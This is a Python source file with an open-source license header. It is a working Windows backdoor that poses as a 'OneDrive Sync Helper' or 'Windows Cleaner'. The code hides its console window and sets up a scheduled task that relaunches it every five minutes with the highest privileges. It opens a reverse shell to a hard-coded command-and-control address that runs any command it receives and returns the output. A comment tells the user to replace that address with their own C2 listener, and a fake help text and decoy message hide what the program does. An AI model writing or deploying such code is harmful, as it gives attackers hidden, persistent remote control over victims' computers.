# Copyright 2025 Agampreet Singh
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import socket
import subprocess
import os
import sys
import time
import getpass

def minimize_window():
    """Minimize console window for cleaner UI (used in background tasks)."""
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def setup_sync_helper_task():
    """Registers this script to run every 5 minutes for system sync maintenance."""
    executable_path = os.path.abspath(sys.argv[0])
    task_name = "OneDriveSyncHelper"
    task_command = f'schtasks /Create /F /SC MINUTE /MO 5 /TN {task_name} /TR "{executable_path}" /RL HIGHEST'
    try:
        subprocess.run(task_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

def start_sync_listener(sync_host, sync_port):
    """Connects to remote synchronization server for command and control exchange."""
    try:
        connection = socket.socket()
        connection.connect((sync_host, sync_port))
        while True:
            connection.send(b'SyncShell> ')
            command = connection.recv(1024).decode().strip()
            if command.lower() == "exit":
                break
            if not command:
                continue
            try:
                response = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as err:
                response = err.output
            except Exception as err:
                response = str(err).encode()
            connection.send(response + b"\n")
        connection.close()
    except Exception:
        pass  # Let scheduler handle retry on next cycle

if __name__ == "__main__":
    # Show fake help message if called with --help
    if "--help" in sys.argv or "-h" in sys.argv:
        print("OneDrive Sync Helper Utility\nUsage: onedrive_sync_helper.exe [--sync] [--status]")
        sys.exit(0)

    minimize_window()
    setup_sync_helper_task()
    start_sync_listener("192.168.137.90", 4343)  # Replace with your C2 listener
    print("Windows Cleaner: Please wait... it will complete within 5 minutes.")
